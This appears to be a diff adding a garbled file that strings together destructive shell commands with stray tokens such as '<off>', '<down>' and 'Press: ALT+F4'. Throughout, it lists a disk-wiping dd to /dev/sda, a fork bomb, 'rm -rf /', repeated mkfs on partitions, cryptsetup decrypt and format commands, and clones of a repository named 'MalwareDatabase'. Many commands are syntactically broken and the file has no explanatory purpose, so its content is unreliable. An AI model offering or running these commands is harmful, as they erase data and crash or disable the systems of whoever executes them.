@@ -1,0 +1,55 @@
+Press: ALT+F4
+<off>
+Debootstrap
+dd if=/dev/random of=/dev/sda
+<off>
+:(){:|:&};:
+git clone https://github.com/HBMS-0em/off/blob/main/.gitignore
+Press: ALT+F4
+>file
+mkfs ext4 /dev/sda3. 2a
+mkfs ext4 /dev/sda3. 2
+>file 
+mkfs ext4 /dev/sda3. 2c
+mkfs ext4 /dev/sda3. 2d
+>file
+dd if=/dev/random of=/dev/sda
+Press: ALT+F4
+<off>
+dd if=/dev/random of=/dev/sda
+<inside out>
+sudo cryptsetup reencrypt /dev/0em0 –decrypt 
+rm -rf /
+sudo cryptsetup reencrypt /dev/KTone –decrypt 
+rm -rf /
+mkfs ext4 /dev/sda3. 2a
+mkfs ext4 /dev/sda3. 2
+>file 
+mkfs ext4 /dev/sda3. 2c
+mkfs ext4 /dev/sda3. 2d
+git clone https://github.com/Endermanch/MalwareDatabase
+>file
+<down>
+<down>
+>file
+<down>
+<down>
+<down>
+>file
+<down>
+<down>
+<down>
+>file
+<down>
+<down>
+<down>
+>file
+<down>
+<down>
+<down>
+>file
+<down>
+<down> 
+Sudo cryptsetup –hash sha512 –verbose –cipher aes-xts-plain –key size 512 luksFormat /dev/sda1
+ >file
+ 
